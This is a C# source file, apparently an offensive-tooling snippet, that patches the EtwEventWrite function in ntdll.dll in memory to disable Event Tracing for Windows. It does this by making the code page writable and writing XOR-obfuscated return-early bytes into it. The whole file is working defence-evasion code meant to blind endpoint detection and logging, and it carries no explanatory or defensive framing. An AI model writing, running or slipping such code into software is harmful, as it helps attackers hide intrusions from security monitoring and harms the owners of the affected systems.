using System;
using System.Runtime.InteropServices;

namespace OffensiveSnippets
{
    public class Program
    {
        [DllImport(
            "kernel32.dll",
            EntryPoint = "LoadLibrary",
            SetLastError = false
        )]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport(
            "kernel32.dll",
            EntryPoint = "GetProcAddress",
            SetLastError = false
        )]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport(
            "kernel32.dll",
            EntryPoint = "VirtualProtect",
            SetLastError = false
        )]
        public static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );
        [DllImport(
            "kernel32.dll",
            EntryPoint = "RtlMoveMemory",
            SetLastError = false
        )]
        static extern void RtlMoveMemory(IntPtr dest, IntPtr src, int size);

        public static int PatchETW()
        {
            IntPtr targetDLL = LoadLibrary("ntdll.dll");
            if (targetDLL == IntPtr.Zero)
            {
                return 1;
            }

            IntPtr EtwEventWritePtr = GetProcAddress(targetDLL, "EtwEventWrite");
            if (EtwEventWritePtr == IntPtr.Zero)
            {
                return 1;
            }

            UIntPtr dwSize = (UIntPtr)4;
            uint Zero = 0;
            if (!VirtualProtect(EtwEventWritePtr, dwSize, 0x40, out Zero))
            {
                return 1;
            }

            byte[] buf = { 0xb2, 0xc9, 0x3a, 0x39 };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(buf, 0, unmanagedPointer, 3);

            RtlMoveMemory(EtwEventWritePtr + 0x001b, unmanagedPointer, 3);
            return 0;
        }

        public static void Main(string[] args)
        {
            int checkETW = PatchETW();
            if (checkETW == 0)
            {
                Console.WriteLine("[+] ETW pathced.");
            }
            else
            {
                Environment.Exit(0);
            }

        }
    }
}
